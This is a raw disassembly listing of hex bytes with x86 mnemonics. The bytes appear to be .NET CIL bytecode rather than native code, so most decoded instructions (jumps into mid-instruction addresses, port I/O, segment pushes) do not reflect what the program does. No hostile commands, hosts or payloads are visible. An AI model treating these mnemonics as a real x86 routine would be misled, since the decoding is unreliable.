  40258d:	3a 00                	cmp    (%eax),%al
  40258f:	70 1b                	jo     0x4025ac
  402591:	8d 10                	lea    (%eax),%edx
  402593:	00 00                	add    %al,(%eax)
  402595:	01 25 16 03 a2 25    	add    %esp,0x25a20316
  40259b:	17                   	pop    %ss
  40259c:	04 8c                	add    $0x8c,%al
  40259e:	58                   	pop    %eax
  40259f:	00 00                	add    %al,(%eax)
  4025a1:	01 a2 25 18 06 a2    	add    %esp,-0x5df9e7db(%edx)
  4025a7:	25 19 06 a2 25       	and    $0x25a20619,%eax
  4025ac:	1a 06                	sbb    (%esi),%al
  4025ae:	a2 28 2f 00 00       	mov    %al,0x2f28
  4025b3:	0a 0a                	or     (%edx),%cl
  4025b5:	00 00                	add    %al,(%eax)
  4025b7:	38 84 00 00 00 06 28 	cmp    %al,0x28060000(%eax,%eax,1)
  4025be:	30 00                	xor    %al,(%eax)
  4025c0:	00 0a                	add    %cl,(%edx)
  4025c2:	0d 09 2c 35 00       	or     $0x352c09,%eax
  4025c7:	05 13 04 11 04       	add    $0x4110413,%eax
  4025cc:	2c 16                	sub    $0x16,%al
  4025ce:	00 72 b7             	add    %dh,-0x49(%edx)
  4025d1:	3a 00                	cmp    (%eax),%al
  4025d3:	70 03                	jo     0x4025d8
  4025d5:	04 8c                	add    $0x8c,%al
  4025d7:	58                   	pop    %eax
  4025d8:	00 00                	add    %al,(%eax)
  4025da:	01 28                	add    %ebp,(%eax)
  4025dc:	31 00                	xor    %eax,(%eax)
  4025de:	00 0a                	add    %cl,(%edx)
  4025e0:	0a 00                	or     (%eax),%al
  4025e2:	2b 14 00             	sub    (%eax,%eax,1),%edx
  4025e5:	72 ed                	jb     0x4025d4
  4025e7:	3a 00                	cmp    (%eax),%al
  4025e9:	70 03                	jo     0x4025ee
  4025eb:	04 8c                	add    $0x8c,%al
  4025ed:	58                   	pop    %eax
  4025ee:	00 00                	add    %al,(%eax)
  4025f0:	01 28                	add    %ebp,(%eax)
  4025f2:	31 00                	xor    %eax,(%eax)
  4025f4:	00 0a                	add    %cl,(%edx)
  4025f6:	0a 00                	or     (%eax),%al
  4025f8:	00 2b                	add    %ch,(%ebx)
  4025fa:	45                   	inc    %ebp
  4025fb:	00 06                	add    %al,(%esi)
  4025fd:	72 07                	jb     0x402606
  4025ff:	3b 00                	cmp    (%eax),%eax
  402601:	70 72                	jo     0x402675
  402603:	ed                   	in     (%dx),%eax
  402604:	3a 00                	cmp    (%eax),%al
  402606:	70 03                	jo     0x40260b
  402608:	04 8c                	add    $0x8c,%al
  40260a:	58                   	pop    %eax
  40260b:	00 00                	add    %al,(%eax)
  40260d:	01 28                	add    %ebp,(%eax)
  40260f:	31 00                	xor    %eax,(%eax)
  402611:	00 0a                	add    %cl,(%edx)
  402613:	28 32                	sub    %dh,(%edx)
  402615:	00 00                	add    %al,(%eax)
  402617:	0a 0a                	or     (%edx),%cl
  402619:	05 13 05 11 05       	add    $0x5110513,%eax
  40261e:	2c 1f                	sub    $0x1f,%al
  402620:	00 06                	add    %al,(%esi)
  402622:	72 37                	jb     0x40265b
  402624:	3b 00                	cmp    (%eax),%eax
  402626:	70 72                	jo     0x40269a
  402628:	69 3b 00 70 03 04    	imul   $0x4037000,(%ebx),%edi
  40262e:	8c 58 00             	mov    %ds,0x0(%eax)
  402631:	00 01                	add    %al,(%ecx)
  402633:	28 31                	sub    %dh,(%ecx)
  402635:	00 00                	add    %al,(%eax)
  402637:	0a 28                	or     (%eax),%ch
  402639:	32 00                	xor    (%eax),%al
  40263b:	00 0a                	add    %cl,(%edx)
  40263d:	0a 00                	or     (%eax),%al
  40263f:	00 72 0e             	add    %dh,0xe(%edx)
  402642:	39 00                	cmp    %eax,(%eax)
  402644:	70 72                	jo     0x4026b8
  402646:	c3                   	ret
  402647:	39 00                	cmp    %eax,(%eax)
  402649:	70 06                	jo     0x402651
  40264b:	28 33                	sub    %dh,(%ebx)
  40264d:	00 00                	add    %al,(%eax)
  40264f:	0a 00                	or     (%eax),%al
  402651:	72 0e                	jb     0x402661
  402653:	39 00                	cmp    %eax,(%eax)
  402655:	70 72                	jo     0x4026c9
  402657:	ab                   	stos   %eax,%es:(%edi)
  402658:	39 00                	cmp    %eax,(%eax)
  40265a:	70 17                	jo     0x402673
  40265c:	8c 58 00             	mov    %ds,0x0(%eax)
  40265f:	00 01                	add    %al,(%ecx)
  402661:	28 33                	sub    %dh,(%ebx)
  402663:	00 00                	add    %al,(%eax)
  402665:	0a 00                	or     (%eax),%al
  402667:	7e 34                	jle    0x40269d
  402669:	00 00                	add    %al,(%eax)
  40266b:	0a 1f                	or     (%edi),%bl
  40266d:	27                   	daa
  40266e:	7e 34                	jle    0x4026a4
  402670:	00 00                	add    %al,(%eax)
  402672:	0a 16                	or     (%esi),%dl
  402674:	28 0b                	sub    %cl,(%ebx)
  402676:	00 00                	add    %al,(%eax)
  402678:	06                   	push   %es
  402679:	26 7e 34             	es jle 0x4026b0
  40267c:	00 00                	add    %al,(%eax)
  40267e:	0a 1f                	or     (%edi),%bl
  402680:	25 7e 34 00 00       	and    $0x347e,%eax
  402685:	0a 16                	or     (%esi),%dl
  402687:	28 0b                	sub    %cl,(%ebx)
  402689:	00 00                	add    %al,(%eax)
  40268b:	06                   	push   %es
  40268c:	26 2a 00             	sub    %es:(%eax),%al
  40268f:	00 13                	add    %dl,(%ebx)
  402691:	30 04 00             	xor    %al,(%eax,%eax,1)
  402694:	59                   	pop    %ecx
	...
  40269d:	72 0e                	jb     0x4026ad
  40269f:	39 00                	cmp    %eax,(%eax)
  4026a1:	70 72                	jo     0x402715
  4026a3:	c3                   	ret
  4026a4:	39 00                	cmp    %eax,(%eax)
  4026a6:	70 02                	jo     0x4026aa
  4026a8:	7b 08                	jnp    0x4026b2
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	04 28                	add    $0x28,%al
  4026ae:	33 00                	xor    (%eax),%eax
  4026b0:	00 0a                	add    %cl,(%edx)
  4026b2:	00 72 0e             	add    %dh,0xe(%edx)
  4026b5:	39 00                	cmp    %eax,(%eax)
  4026b7:	70 72                	jo     0x40272b
  4026b9:	ab                   	stos   %eax,%es:(%edi)
  4026ba:	39 00                	cmp    %eax,(%eax)
  4026bc:	70 02                	jo     0x4026c0
  4026be:	7b 07                	jnp    0x4026c7
  4026c0:	00 00                	add    %al,(%eax)
  4026c2:	04 8c                	add    $0x8c,%al
  4026c4:	58                   	pop    %eax
  4026c5:	00 00                	add    %al,(%eax)
  4026c7:	01 28                	add    %ebp,(%eax)
  4026c9:	33 00                	xor    (%eax),%eax
  4026cb:	00 0a                	add    %cl,(%edx)
  4026cd:	00 7e 34             	add    %bh,0x34(%esi)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	0a 1f                	or     (%edi),%bl
  4026d4:	27                   	daa
  4026d5:	7e 34                	jle    0x40270b
  4026d7:	00 00                	add    %al,(%eax)
  4026d9:	0a 16                	or     (%esi),%dl
  4026db:	28 0b                	sub    %cl,(%ebx)
  4026dd:	00 00                	add    %al,(%eax)
  4026df:	06                   	push   %es
  4026e0:	26 7e 34             	es jle 0x402717
  4026e3:	00 00                	add    %al,(%eax)
  4026e5:	0a 1f                	or     (%edi),%bl
  4026e7:	25 7e 34 00 00       	and    $0x347e,%eax
  4026ec:	0a 16                	or     (%esi),%dl
  4026ee:	28 0b                	sub    %cl,(%ebx)
  4026f0:	00 00                	add    %al,(%eax)
  4026f2:	06                   	push   %es
  4026f3:	26 2a 6a 02          	sub    %es:0x2(%edx),%ch
  4026f7:	16                   	push   %ss
  4026f8:	7d 07                	jge    0x402701
  4026fa:	00 00                	add    %al,(%eax)
  4026fc:	04 02                	add    $0x2,%al
  4026fe:	72 db                	jb     0x4026db
  402700:	39 00                	cmp    %eax,(%eax)
  402702:	70 7d                	jo     0x402781
  402704:	08 00                	or     %al,(%eax)
  402706:	00 04 02             	add    %al,(%edx,%eax,1)
  402709:	28 22                	sub    %ah,(%edx)
  40270b:	00 00                	add    %al,(%eax)
  40270d:	0a 00                	or     (%eax),%al
  40270f:	2a 13                	sub    (%ebx),%dl
  402711:	30 03                	xor    %al,(%ebx)
  402713:	00 63 00             	add    %ah,0x0(%ebx)
  402716:	00 00                	add    %al,(%eax)
  402718:	04 00                	add    $0x0,%al
  40271a:	00 11                	add    %dl,(%ecx)
  40271c:	00 7e 0c             	add    %bh,0xc(%esi)
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 2c                	add    $0x2c,%al
  402723:	0f 7e 0c 00          	movd   %mm1,(%eax,%eax,1)
  402727:	00 04 28             	add    %al,(%eax,%ebp,1)
  40272a:	30 00                	xor    %al,(%eax)
  40272c:	00 0a                	add    %cl,(%edx)
  40272e:	16                   	push   %ss
  40272f:	fe 01                	incb   (%ecx)
  402731:	2b 01                	sub    (%ecx),%eax
  402733:	16                   	push   %ss
  402734:	0a 06                	or     (%esi),%al
  402736:	2c 44                	sub    $0x44,%al
  402738:	00 73 35             	add    %dh,0x35(%ebx)
  40273b:	00 00                	add    %al,(%eax)
  40273d:	0a 0b                	or     (%ebx),%cl
  40273f:	07                   	pop    %es
  402740:	6f                   	outsl  %ds:(%esi),(%dx)
  402741:	36 00 00             	add    %al,%ss:(%eax)
  402744:	0a 7e 0c             	or     0xc(%esi),%bh
  402747:	00 00                	add    %al,(%eax)
  402749:	04 7e                	add    $0x7e,%al
  40274b:	0b 00                	or     (%eax),%eax
  40274d:	00 04 28             	add    %al,(%eax,%ebp,1)
  402750:	37                   	aaa
  402751:	00 00                	add    %al,(%eax)
  402753:	0a 6f 38             	or     0x38(%edi),%ch
  402756:	00 00                	add    %al,(%eax)
  402758:	0a 00                	or     (%eax),%al
  40275a:	07                   	pop    %es
  40275b:	6f                   	outsl  %ds:(%esi),(%dx)
  40275c:	36 00 00             	add    %al,%ss:(%eax)
  40275f:	0a 72 85             	or     -0x7b(%edx),%dh
  402762:	3b 00                	cmp    (%eax),%eax
  402764:	70 6f                	jo     0x4027d5
  402766:	39 00                	cmp    %eax,(%eax)
  402768:	00 0a                	add    %cl,(%edx)
  40276a:	00 07                	add    %al,(%edi)
  40276c:	6f                   	outsl  %ds:(%esi),(%dx)
  40276d:	3a 00                	cmp    (%eax),%al
  40276f:	00 0a                	add    %cl,(%edx)
  402771:	26 07                	es pop %es
  402773:	6f                   	outsl  %ds:(%esi),(%dx)
  402774:	3b 00                	cmp    (%eax),%eax
  402776:	00 0a                	add    %cl,(%edx)
  402778:	00 00                	add    %al,(%eax)
  40277a:	2b 02                	sub    (%edx),%eax
  40277c:	00 00                	add    %al,(%eax)
  40277e:	2a 00                	sub    (%eax),%al
  402780:	13 30                	adc    (%eax),%esi
  402782:	05 00 4e 00 00       	add    $0x4e00,%eax
  402787:	00 00                	add    %al,(%eax)
  402789:	00 00                	add    %al,(%eax)
  40278b:	00 72 af             	add    %dh,-0x51(%edx)
  40278e:	3b 00                	cmp    (%eax),%eax
  402790:	70 28                	jo     0x4027ba
  402792:	3c 00                	cmp    $0x0,%al
  402794:	00 0a                	add    %cl,(%edx)
  402796:	80 0a 00             	orb    $0x0,(%edx)
  402799:	00 04 72             	add    %al,(%edx,%esi,2)
  40279c:	b9 3b 00 70 80       	mov    $0x8070003b,%ecx
  4027a1:	0b 00                	or     (%eax),%eax
  4027a3:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a6:	0a 00                	or     (%eax),%al
  4027a8:	00 04 17             	add    %al,(%edi,%edx,1)
  4027ab:	8d 60 00             	lea    0x0(%eax),%esp
  4027ae:	00 01                	add    %al,(%ecx)
  4027b0:	25 16 1f 3b 9d       	and    $0x9d3b1f16,%eax
  4027b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4027b6:	3d 00 00 0a 7e       	cmp    $0x7e0a0000,%eax
  4027bb:	25 00 00 04 fe       	and    $0xfe040000,%eax
  4027c0:	06                   	push   %es
  4027c1:	28 00                	sub    %al,(%eax)
  4027c3:	00 06                	add    %al,(%esi)
  4027c5:	73 3e                	jae    0x402805
  4027c7:	00 00                	add    %al,(%eax)
  4027c9:	0a 28                	or     (%eax),%ch
  4027cb:	01 00                	add    %eax,(%eax)
  4027cd:	00 2b                	add    %ch,(%ebx)
  4027cf:	28 02                	sub    %al,(%edx)
  4027d1:	00 00                	add    %al,(%eax)
  4027d3:	2b 80 0c 00 00 04    	sub    0x400000c(%eax),%eax
  4027d9:	2a 00                	sub    (%eax),%al
  4027db:	00 13                	add    %dl,(%ebx)
  4027dd:	30 03                	xor    %al,(%ebx)
  4027df:	00 52 00             	add    %dl,0x0(%edx)
  4027e2:	00 00                	add    %al,(%eax)
  4027e4:	00 00                	add    %al,(%eax)
  4027e6:	00 00                	add    %al,(%eax)
  4027e8:	02 28                	add    (%eax),%ch
  4027ea:	22 00                	and    (%eax),%al
  4027ec:	00 0a                	add    %cl,(%edx)
  4027ee:	00 00                	add    %al,(%eax)
  4027f0:	02 73 41             	add    0x41(%ebx),%dh
  4027f3:	00 00                	add    %al,(%eax)
  4027f5:	0a 7d 0d             	or     0xd(%ebp),%bh
  4027f8:	00 00                	add    %al,(%eax)
  4027fa:	04 02                	add    $0x2,%al
  4027fc:	7b 0d                	jnp    0x40280b
  4027fe:	00 00                	add    %al,(%eax)
  402800:	04 6f                	add    $0x6f,%al
  402802:	42                   	inc    %edx
  402803:	00 00                	add    %al,(%eax)
  402805:	0a 72 d5             	or     -0x2b(%edx),%dh
  402808:	3b 00                	cmp    (%eax),%eax
  40280a:	70 03                	jo     0x40280f
  40280c:	8c 58 00             	mov    %ds,0x0(%eax)
  40280f:	00 01                	add    %al,(%ecx)
  402811:	28 1a                	sub    %bl,(%edx)
  402813:	00 00                	add    %al,(%eax)
  402815:	0a 6f 43             	or     0x43(%edi),%ch
  402818:	00 00                	add    %al,(%eax)
  40281a:	0a 00                	or     (%eax),%al
  40281c:	72 01                	jb     0x40281f
  40281e:	3c 00                	cmp    $0x0,%al
  402820:	70 03                	jo     0x402825
  402822:	8c 58 00             	mov    %ds,0x0(%eax)
  402825:	00 01                	add    %al,(%ecx)
  402827:	28 1a                	sub    %bl,(%edx)
  402829:	00 00                	add    %al,(%eax)
  40282b:	0a 28                	or     (%eax),%ch
  40282d:	19 00                	sbb    %eax,(%eax)
  40282f:	00 0a                	add    %cl,(%edx)
  402831:	00 02                	add    %al,(%edx)
  402833:	04 7d                	add    $0x7d,%al
  402835:	0e                   	push   %cs
  402836:	00 00                	add    %al,(%eax)
  402838:	04 2a                	add    $0x2a,%al
  40283a:	00 00                	add    %al,(%eax)
  40283c:	13 30                	adc    (%eax),%esi
  40283e:	02 00                	add    (%eax),%al
  402840:	2d 00 00 00 05       	sub    $0x5000000,%eax
  402845:	00 00                	add    %al,(%eax)
  402847:	11 73 29             	adc    %esi,0x29(%ebx)
  40284a:	00 00                	add    %al,(%eax)
  40284c:	06                   	push   %es
  40284d:	0a 06                	or     (%esi),%al
  40284f:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402853:	0a 7d 27             	or     0x27(%ebp),%bh
  402856:	00 00                	add    %al,(%eax)
  402858:	04 06                	add    $0x6,%al
  40285a:	02 7d 28             	add    0x28(%ebp),%bh
  40285d:	00 00                	add    %al,(%eax)
  40285f:	04 06                	add    $0x6,%al
  402861:	15 7d 26 00 00       	adc    $0x267d,%eax
  402866:	04 06                	add    $0x6,%al
  402868:	7c 27                	jl     0x402891
  40286a:	00 00                	add    %al,(%eax)
  40286c:	04 12                	add    $0x12,%al
  40286e:	00 28                	add    %ch,(%eax)
  402870:	03 00                	add    (%eax),%eax
  402872:	00 2b                	add    %ch,(%ebx)
  402874:	2a 3a                	sub    (%edx),%bh
  402876:	00 02                	add    %al,(%edx)
  402878:	7b 0d                	jnp    0x402887
  40287a:	00 00                	add    %al,(%eax)
  40287c:	04 6f                	add    $0x6f,%al
  40287e:	46                   	inc    %esi
  40287f:	00 00                	add    %al,(%eax)
  402881:	0a 00                	or     (%eax),%al
  402883:	2a 3e                	sub    (%esi),%bh
  402885:	02 03                	add    (%ebx),%al
  402887:	04 05                	add    $0x5,%al
  402889:	0e                   	push   %cs
  40288a:	04 16                	add    $0x16,%al
  40288c:	28 15 00 00 06 00    	sub    %dl,0x60000
  402892:	00 2a                	add    %ch,(%edx)
  402894:	4a                   	dec    %edx
  402895:	02 03                	add    (%ebx),%al
  402897:	04 05                	add    $0x5,%al
  402899:	0e                   	push   %cs
  40289a:	04 0e                	add    $0xe,%al
  40289c:	05 14 14 28 16       	add    $0x16281414,%eax
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	06                   	push   %es
  4028a4:	00 00                	add    %al,(%eax)
  4028a6:	2a 00                	sub    (%eax),%al
  4028a8:	1b 30                	sbb    (%eax),%esi
  4028aa:	04 00                	add    $0x0,%al
  4028ac:	91                   	xchg   %eax,%ecx
  4028ad:	01 00                	add    %eax,(%eax)
  4028af:	00 06                	add    %al,(%esi)
  4028b1:	00 00                	add    %al,(%eax)
  4028b3:	11 02                	adc    %eax,(%edx)
  4028b5:	17                   	pop    %ss
  4028b6:	73 47                	jae    0x4028ff
  4028b8:	00 00                	add    %al,(%eax)
  4028ba:	0a 7d 0f             	or     0xf(%ebp),%bh
  4028bd:	00 00                	add    %al,(%eax)
  4028bf:	04 02                	add    $0x2,%al
  4028c1:	16                   	push   %ss
  4028c2:	7d 13                	jge    0x4028d7
  4028c4:	00 00                	add    %al,(%eax)
  4028c6:	04 02                	add    $0x2,%al
  4028c8:	28 22                	sub    %ah,(%edx)
  4028ca:	00 00                	add    %al,(%eax)
  4028cc:	0a 00                	or     (%eax),%al
  4028ce:	00 02                	add    %al,(%edx)
  4028d0:	0e                   	push   %cs
  4028d1:	05 7d 1e 00 00       	add    $0x1e7d,%eax
  4028d6:	04 02                	add    $0x2,%al
  4028d8:	03 7d 1f             	add    0x1f(%ebp),%edi
  4028db:	00 00                	add    %al,(%eax)
  4028dd:	04 02                	add    $0x2,%al
  4028df:	04 7d                	add    $0x7d,%al
  4028e1:	14 00                	adc    $0x0,%al
  4028e3:	00 04 02             	add    %al,(%edx,%eax,1)
  4028e6:	05 7d 17 00 00       	add    $0x177d,%eax
  4028eb:	04 02                	add    $0x2,%al
  4028ed:	0e                   	push   %cs
  4028ee:	04 28                	add    $0x28,%al
  4028f0:	48                   	dec    %eax
  4028f1:	00 00                	add    %al,(%eax)
  4028f3:	0a 28                	or     (%eax),%ch
  4028f5:	48                   	dec    %eax
  4028f6:	00 00                	add    %al,(%eax)
  4028f8:	0a 7d 21             	or     0x21(%ebp),%bh
  4028fb:	00 00                	add    %al,(%eax)
  4028fd:	04 02                	add    $0x2,%al
  4028ff:	0e                   	push   %cs
  402900:	06                   	push   %es
  402901:	7d 20                	jge    0x402923
  402903:	00 00                	add    %al,(%eax)
  402905:	04 73                	add    $0x73,%al
  402907:	49                   	dec    %ecx
  402908:	00 00                	add    %al,(%eax)
  40290a:	0a 0b                	or     (%ebx),%cl
  40290c:	00 02                	add    %al,(%edx)
  40290e:	07                   	pop    %es
  40290f:	04 6f                	add    $0x6f,%al
  402911:	4a                   	dec    %edx
  402912:	00 00                	add    %al,(%eax)
  402914:	0a 28                	or     (%eax),%ch
  402916:	4b                   	dec    %ebx
  402917:	00 00                	add    %al,(%eax)
  402919:	0a 7d 15             	or     0x15(%ebp),%bh
  40291c:	00 00                	add    %al,(%eax)
  40291e:	04 00                	add    $0x0,%al
  402920:	de 0b                	fimuls (%ebx)
  402922:	07                   	pop    %es
  402923:	2c 07                	sub    $0x7,%al
  402925:	07                   	pop    %es
  402926:	6f                   	outsl  %ds:(%esi),(%dx)
  402927:	21 00                	and    %eax,(%eax)
  402929:	00 0a                	add    %cl,(%edx)
  40292b:	00 dc                	add    %bl,%ah
  40292d:	73 4c                	jae    0x40297b
  40292f:	00 00                	add    %al,(%eax)
  402931:	0a 0c 00             	or     (%eax,%eax,1),%cl
  402934:	02 08                	add    (%eax),%cl
  402936:	04 6f                	add    $0x6f,%al
  402938:	4a                   	dec    %edx
  402939:	00 00                	add    %al,(%eax)
  40293b:	0a 28                	or     (%eax),%ch
  40293d:	4b                   	dec    %ebx
  40293e:	00 00                	add    %al,(%eax)
  402940:	0a 7d 16             	or     0x16(%ebp),%bh
  402943:	00 00                	add    %al,(%eax)
  402945:	04 00                	add    $0x0,%al
  402947:	de 0b                	fimuls (%ebx)
  402949:	08 2c 07             	or     %ch,(%edi,%eax,1)
  40294c:	08 6f 21             	or     %ch,0x21(%edi)
  40294f:	00 00                	add    %al,(%eax)
  402951:	0a 00                	or     (%eax),%al
  402953:	dc 73 4d             	fdivl  0x4d(%ebx)
  402956:	00 00                	add    %al,(%eax)
  402958:	0a 0a                	or     (%edx),%cl
  40295a:	02 06                	add    (%esi),%al
  40295c:	20 a0 bb 0d 00 20    	and    %ah,0x20000dbb(%eax)
  402962:	3f                   	aas
  402963:	42                   	inc    %edx
  402964:	0f 00 6f 4e          	verw   0x4e(%edi)
  402968:	00 00                	add    %al,(%eax)
  40296a:	0a 7d 18             	or     0x18(%ebp),%bh
  40296d:	00 00                	add    %al,(%eax)
  40296f:	04 02                	add    $0x2,%al
  402971:	06                   	push   %es
  402972:	20 a0 bb 0d 00 20    	and    %ah,0x20000dbb(%eax)
  402978:	3f                   	aas
  402979:	42                   	inc    %edx
  40297a:	0f 00 6f 4e          	verw   0x4e(%edi)
  40297e:	00 00                	add    %al,(%eax)
  402980:	0a 7d 19             	or     0x19(%ebp),%bh
  402983:	00 00                	add    %al,(%eax)
  402985:	04 02                	add    $0x2,%al
  402987:	06                   	push   %es
  402988:	20 80 38 01 00 20    	and    %al,0x20000138(%eax)
  40298e:	9f                   	lahf
  40298f:	86 01                	xchg   %al,(%ecx)
  402991:	00 6f 4e             	add    %ch,0x4e(%edi)
  402994:	00 00                	add    %al,(%eax)
  402996:	0a 7d 1a             	or     0x1a(%ebp),%bh
  402999:	00 00                	add    %al,(%eax)
  40299b:	04 02                	add    $0x2,%al
  40299d:	06                   	push   %es
  40299e:	20 80 38 01 00 20    	and    %al,0x20000138(%eax)
  4029a4:	9f                   	lahf
  4029a5:	86 01                	xchg   %al,(%ecx)
  4029a7:	00 6f 4e             	add    %ch,0x4e(%edi)
  4029aa:	00 00                	add    %al,(%eax)
  4029ac:	0a 7d 1b             	or     0x1b(%ebp),%bh
  4029af:	00 00                	add    %al,(%eax)
  4029b1:	04 02                	add    $0x2,%al
  4029b3:	28 4f 00             	sub    %cl,0x0(%edi)
  4029b6:	00 0a                	add    %cl,(%edx)
  4029b8:	0d 12 03 fe 16       	or     $0x16fe0312,%eax
  4029bd:	29 00                	sub    %eax,(%eax)
  4029bf:	00 01                	add    %al,(%ecx)
  4029c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c2:	50                   	push   %eax
  4029c3:	00 00                	add    %al,(%eax)
  4029c5:	0a 7d 1c             	or     0x1c(%ebp),%bh
  4029c8:	00 00                	add    %al,(%eax)
  4029ca:	04 02                	add    $0x2,%al
  4029cc:	28 4f 00             	sub    %cl,0x0(%edi)
  4029cf:	00 0a                	add    %cl,(%edx)
  4029d1:	0d 12 03 fe 16       	or     $0x16fe0312,%eax
  4029d6:	29 00                	sub    %eax,(%eax)
  4029d8:	00 01                	add    %al,(%ecx)
  4029da:	6f                   	outsl  %ds:(%esi),(%dx)
  4029db:	50                   	push   %eax
  4029dc:	00 00                	add    %al,(%eax)
  4029de:	0a 7d 1d             	or     0x1d(%ebp),%bh
  4029e1:	00 00                	add    %al,(%eax)
  4029e3:	04 02                	add    $0x2,%al
  4029e5:	0e                   	push   %cs
  4029e6:	07                   	pop    %es
  4029e7:	7d 22                	jge    0x402a0b
  4029e9:	00 00                	add    %al,(%eax)
  4029eb:	04 02                	add    $0x2,%al
  4029ed:	16                   	push   %ss
  4029ee:	16                   	push   %ss
  4029ef:	16                   	push   %ss
  4029f0:	73 51                	jae    0x402a43
  4029f2:	00 00                	add    %al,(%eax)
  4029f4:	0a 7d 10             	or     0x10(%ebp),%bh
  4029f7:	00 00                	add    %al,(%eax)
  4029f9:	04 02                	add    $0x2,%al
  4029fb:	7b 10                	jnp    0x402a0d
  4029fd:	00 00                	add    %al,(%eax)
  4029ff:	04 02                	add    $0x2,%al
  402a01:	fe 06                	incb   (%esi)
  402a03:	1f                   	pop    %ds
  402a04:	00 00                	add    %al,(%eax)
  402a06:	06                   	push   %es
  402a07:	73 52                	jae    0x402a5b
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	0a 6f 53             	or     0x53(%edi),%ch
  402a0e:	00 00                	add    %al,(%eax)
  402a10:	0a 00                	or     (%eax),%al
  402a12:	02 7b 10             	add    0x10(%ebx),%bh
  402a15:	00 00                	add    %al,(%eax)
  402a17:	04 16                	add    $0x16,%al
  402a19:	6f                   	outsl  %ds:(%esi),(%dx)
  402a1a:	54                   	push   %esp
  402a1b:	00 00                	add    %al,(%eax)
  402a1d:	0a 00                	or     (%eax),%al
  402a1f:	02 7b 10             	add    0x10(%ebx),%bh
  402a22:	00 00                	add    %al,(%eax)
  402a24:	04 16                	add    $0x16,%al
  402a26:	6f                   	outsl  %ds:(%esi),(%dx)
  402a27:	55                   	push   %ebp
  402a28:	00 00                	add    %al,(%eax)
  402a2a:	0a 00                	or     (%eax),%al
  402a2c:	02 7b 10             	add    0x10(%ebx),%bh
  402a2f:	00 00                	add    %al,(%eax)
  402a31:	04 16                	add    $0x16,%al
  402a33:	6f                   	outsl  %ds:(%esi),(%dx)
  402a34:	56                   	push   %esi
  402a35:	00 00                	add    %al,(%eax)
  402a37:	0a 00                	or     (%eax),%al
  402a39:	02 73 0e             	add    0xe(%ebx),%dh
  402a3c:	00 00                	add    %al,(%eax)
  402a3e:	06                   	push   %es
  402a3f:	7d 12                	jge    0x402a53
  402a41:	00 00                	add    %al,(%eax)
  402a43:	04 2a                	add    $0x2a,%al
  402a45:	00 00                	add    %al,(%eax)
  402a47:	00 01                	add    %al,(%ecx)
  402a49:	1c 00                	sbb    $0x0,%al
  402a4b:	00 02                	add    %al,(%edx)
  402a4d:	00 58 00             	add    %bl,0x0(%eax)
  402a50:	16                   	push   %ss
  402a51:	6e                   	outsb  %ds:(%esi),(%dx)
  402a52:	00 0b                	add    %cl,(%ebx)
  402a54:	00 00                	add    %al,(%eax)
  402a56:	00 00                	add    %al,(%eax)
  402a58:	02 00                	add    (%eax),%al
  402a5a:	7f 00                	jg     0x402a5c
  402a5c:	16                   	push   %ss
  402a5d:	95                   	xchg   %eax,%ebp
  402a5e:	00 0b                	add    %cl,(%ebx)
  402a60:	00 00                	add    %al,(%eax)
  402a62:	00 00                	add    %al,(%eax)
  402a64:	1b 30                	sbb    (%eax),%esi
  402a66:	05 00 15 01 00       	add    $0x11500,%eax
  402a6b:	00 07                	add    %al,(%edi)
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	11 00                	adc    %eax,(%eax)
  402a71:	02 7b 10             	add    0x10(%ebx),%bh
  402a74:	00 00                	add    %al,(%eax)
  402a76:	04 02                	add    $0x2,%al
  402a78:	fe 06                	incb   (%esi)
  402a7a:	1b 00                	sbb    (%eax),%eax
  402a7c:	00 06                	add    %al,(%esi)
  402a7e:	73 57                	jae    0x402ad7
  402a80:	00 00                	add    %al,(%eax)
  402a82:	0a 6f 58             	or     0x58(%edi),%ch
  402a85:	00 00                	add    %al,(%eax)
  402a87:	0a 00                	or     (%eax),%al
  402a89:	02 7b 10             	add    0x10(%ebx),%bh
  402a8c:	00 00                	add    %al,(%eax)
  402a8e:	04 02                	add    $0x2,%al
  402a90:	fe 06                	incb   (%esi)
  402a92:	1c 00                	sbb    $0x0,%al
  402a94:	00 06                	add    %al,(%esi)
  402a96:	73 57                	jae    0x402aef
  402a98:	00 00                	add    %al,(%eax)
  402a9a:	0a 6f 59             	or     0x59(%edi),%ch
  402a9d:	00 00                	add    %al,(%eax)
  402a9f:	0a 00                	or     (%eax),%al
  402aa1:	02 7e 5a             	add    0x5a(%esi),%bh
  402aa4:	00 00                	add    %al,(%eax)
  402aa6:	0a 03                	or     (%ebx),%al
  402aa8:	17                   	pop    %ss
  402aa9:	73 5b                	jae    0x402b06
  402aab:	00 00                	add    %al,(%eax)
  402aad:	0a 7d 11             	or     0x11(%ebp),%bh
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	04 02                	add    $0x2,%al
  402ab4:	7b 11                	jnp    0x402ac7
  402ab6:	00 00                	add    %al,(%eax)
  402ab8:	04 02                	add    $0x2,%al
  402aba:	fe 06                	incb   (%esi)
  402abc:	1a 00                	sbb    (%eax),%al
  402abe:	00 06                	add    %al,(%esi)
  402ac0:	73 5c                	jae    0x402b1e
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	0a 6f 5d             	or     0x5d(%edi),%ch
  402ac7:	00 00                	add    %al,(%eax)
  402ac9:	0a 00                	or     (%eax),%al
  402acb:	02 7b 22             	add    0x22(%ebx),%bh
  402ace:	00 00                	add    %al,(%eax)
  402ad0:	04 14                	add    $0x14,%al
  402ad2:	fe 03                	incb   (%ebx)
  402ad4:	0a 06                	or     (%esi),%al
  402ad6:	2c 14                	sub    $0x14,%al
  402ad8:	00 02                	add    %al,(%edx)
  402ada:	7b 11                	jnp    0x402aed
  402adc:	00 00                	add    %al,(%eax)
  402ade:	04 02                	add    $0x2,%al
  402ae0:	7b 22                	jnp    0x402b04
  402ae2:	00 00                	add    %al,(%eax)
  402ae4:	04 6f                	add    $0x6f,%al
  402ae6:	5e                   	pop    %esi
  402ae7:	00 00                	add    %al,(%eax)
  402ae9:	0a 00                	or     (%eax),%al
  402aeb:	00 02                	add    %al,(%edx)
  402aed:	7b 10                	jnp    0x402aff
  402aef:	00 00                	add    %al,(%eax)
